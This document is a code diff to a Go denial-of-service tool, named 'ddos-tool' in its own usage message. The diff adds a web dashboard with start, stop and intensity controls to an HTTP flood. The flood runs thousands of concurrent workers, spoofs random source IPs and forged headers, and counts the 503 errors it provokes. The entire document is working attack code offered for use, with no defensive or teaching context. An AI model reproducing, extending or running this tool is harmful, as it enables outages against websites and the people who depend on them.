@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/tls"
+	"encoding/json"
 	"fmt"
 	"log"
 	"math/rand"
@@ -12,8 +13,11 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
+
+	"github.com/gorilla/mux"
 )
 
 // Global counters
@@ -24,63 +28,71 @@ var (
 	last503Count    uint64
 	activeWorkers   uint64
 	lastRequestTime int64
+	attackRunning   atomic.Bool
+	concurrency     = 5000
+	attackMutex     sync.Mutex
+	targetURL       string
 )
 
 func main() {
 	if len(os.Args) < 2 {
 		log.Fatal("Usage: ./ddos-tool <target-url>")
 	}
-	target := os.Args[1]
+	targetURL = os.Args[1]
 
 	// Validate target
-	if _, err := url.ParseRequestURI(target); err != nil {
+	if _, err := url.ParseRequestURI(targetURL); err != nil {
 		log.Fatalf("Invalid URL: %v", err)
 	}
 
-	// Increase file descriptor limits
-	runtime.GOMAXPROCS(runtime.NumCPU() * 2)
+	// Increase system limits
+	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
 
 	// Start web dashboard
+	router := mux.NewRouter()
+	router.HandleFunc("/", serveDashboard)
+	router.HandleFunc("/stats", statsHandler)
+	router.HandleFunc("/control", controlHandler)
+	
+	fs := http.FileServer(http.Dir("./public"))
+	router.PathPrefix("/public/").Handler(http.StripPrefix("/public/", fs))
+	
+	fmt.Println("Dashboard available at http://localhost:8080")
 	go func() {
-		fs := http.FileServer(http.Dir("./public"))
-		http.Handle("/", fs)
-		http.HandleFunc("/stats", statsHandler)
-		fmt.Println("Dashboard available at http://localhost:8080")
-		log.Fatal(http.ListenAndServe(":8080", nil))
+		log.Fatal(http.ListenAndServe(":8080", router))
 	}()
 
 	// Start attack
-	startAttack(target)
+	attackRunning.Store(true)
+	startAttack()
 }
 
-func startAttack(target string) {
-	concurrency := 5000 // Adjust based on hardware
+func startAttack() {
 	sem := make(chan struct{}, concurrency)
 
-	fmt.Printf("Starting attack on %s with %d workers\n", target, concurrency)
+	// Fill worker pool
+	for i := 0; i < concurrency; i++ {
+		sem <- struct{}{}
+	}
+
+	fmt.Printf("Starting attack on %s with %d workers\n", targetURL, concurrency)
 	fmt.Println("Press Ctrl+C to stop")
 
-	for {
-		sem <- struct{}{}
-		atomic.AddUint64(&activeWorkers, 1)
-		
+	for attackRunning.Load() {
+		<-sem // Wait for available worker slot
 		go func() {
-			defer func() {
-				<-sem
-				atomic.AddUint64(&activeWorkers, ^uint64(0))
-			}()
-			
-			makeRequest(target)
+			defer func() { sem <- struct{}{} }()
+			makeRequest()
 			atomic.AddUint64(&requestsSent, 1)
 			atomic.StoreInt64(&lastRequestTime, time.Now().UnixNano())
 		}()
 	}
 }
 
-func makeRequest(target string) {
+func makeRequest() {
 	ip := generateIP()
 	dialer := &net.Dialer{
-		Timeout:   5 * time.Second,
+		Timeout:   3 * time.Second,
 		KeepAlive: 0,
 		LocalAddr: &net.TCPAddr{IP: net.ParseIP(ip)},
 	}
@@ -95,11 +107,11 @@ func makeRequest(target string) {
 
 	client := &http.Client{
 		Transport: transport,
-		Timeout:   10 * time.Second,
+		Timeout:   5 * time.Second,
 	}
 
-	req, _ := http.NewRequest("GET", target, nil)
-	req.Header = generateHeaders(target, ip)
+	req, _ := http.NewRequest("GET", targetURL, nil)
+	req.Header = generateHeaders(targetURL, ip)
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -195,23 +207,47 @@ func randomCountryCode() string {
 
 func statsHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
-	fmt.Fprintf(w, `{
-		"requests_sent": %d,
-		"success_count": %d,
-		"error_count": %d,
-		"503_count": %d,
-		"active_workers": %d,
-		"last_request": %d,
-		"rps": %.1f
-	}`,
-		atomic.LoadUint64(&requestsSent),
-		atomic.LoadUint64(&successCount),
-		atomic.LoadUint64(&errorCount),
-		atomic.LoadUint64(&last503Count),
-		atomic.LoadUint64(&activeWorkers),
-		atomic.LoadInt64(&lastRequestTime),
-		calculateRPS(),
-	)
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"requests_sent": atomic.LoadUint64(&requestsSent),
+		"success_count": atomic.LoadUint64(&successCount),
+		"error_count":   atomic.LoadUint64(&errorCount),
+		"503_count":     atomic.LoadUint64(&last503Count),
+		"active_workers": concurrency,
+		"last_request":  atomic.LoadInt64(&lastRequestTime),
+		"rps":           calculateRPS(),
+		"is_attacking":  attackRunning.Load(),
+	})
+}
+
+func controlHandler(w http.ResponseWriter, r *http.Request) {
+	action := r.URL.Query().Get("action")
+	attackMutex.Lock()
+	defer attackMutex.Unlock()
+
+	switch action {
+	case "start":
+		if !attackRunning.Load() {
+			attackRunning.Store(true)
+			go startAttack()
+		}
+	case "stop":
+		attackRunning.Store(false)
+	case "intensity_up":
+		concurrency = min(concurrency+500, 20000)
+	case "intensity_down":
+		concurrency = max(concurrency-500, 100)
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"status":      "success",
+		"action":      action,
+		"concurrency": concurrency,
+	})
+}
+
+func serveDashboard(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, "./public/index.html")
 }
 
 func calculateRPS() float64 {
@@ -221,7 +257,21 @@ func calculateRPS() float64 {
 	last := time.Unix(0, atomic.LoadInt64(&lastRequestTime))
 	elapsed := time.Since(last).Seconds()
 	if elapsed < 1 {
-		return float64(requestsSent) / 5 // Initial estimate
+		return float64(requestsSent) / 5
 	}
 	return float64(requestsSent) / elapsed
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
+func max(a, b int) int {
+	if a > b {
+		return a
+	}
+	return b
 }
